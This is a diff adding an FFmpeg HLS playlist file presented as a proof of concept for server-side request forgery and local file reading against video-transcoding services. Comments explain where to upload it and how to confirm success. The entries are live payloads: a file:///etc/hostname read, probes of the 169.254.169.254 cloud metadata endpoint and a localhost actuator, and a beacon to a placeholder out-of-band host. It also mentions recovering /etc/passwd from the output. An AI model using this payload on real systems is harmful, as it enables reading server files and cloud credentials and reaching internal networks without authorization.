@@ -1,0 +1,34 @@
+#EXTM3U
+# Safe PoC -> x8bitranjit
+#EXT-X-VERSION:3
+# ============================================================================
+# FFmpeg HLS file-read / SSRF PoC - x8bitranjit lab style. Authorized testing only.
+#
+# WHAT THIS DEMONSTRATES: FFmpeg (and HLS-aware transcoding services) resolve
+# the URIs listed in an .m3u8 playlist - including file:// and internal http://.
+# Feed this playlist to any "upload video/audio for transcoding" feature and
+# the server reads the referenced sources into the output artifact.
+#
+# WHERE TO USE: video/audio upload+transcode features, media processors,
+# anything accepting "playlist" uploads (m3u8/m3u/concat).
+#
+# WHAT TO EDIT:
+#   - Replace  YOUR-OOB-HOST.example.invalid  with your listener to prove the
+#     fetch (OOB callback from the transcode worker).
+#   - The file:/// entries below are READ-ONLY demos of what gets read; if the
+#     output media is downloadable, the read content is recoverable from the
+#     artifact (extract frames/audio, strings).
+#   - The metadata URL proves internal reach from the worker tier.
+#
+# CONFIRMATION: transcode completes (or errors referencing the file) + OOB hit
+# from the worker IP + downloaded artifact contains /etc/passwd content frames.
+# KIT CROSS-REF: SSRF-047 (ffmpeg HLS), UPL-016, CMDI-025.
+# ============================================================================
+
+# read a local file into the transcode output (benign: /etc/hostname)
+file:///etc/hostname
+# internal reachability probes (worker tier position)
+http://169.254.169.254/latest/meta-data/
+http://127.0.0.1:8080/actuator/health
+# OOB beacon (edit host)
+http://ffmpeg-ssrf.YOUR-OOB-HOST.example.invalid/beacon
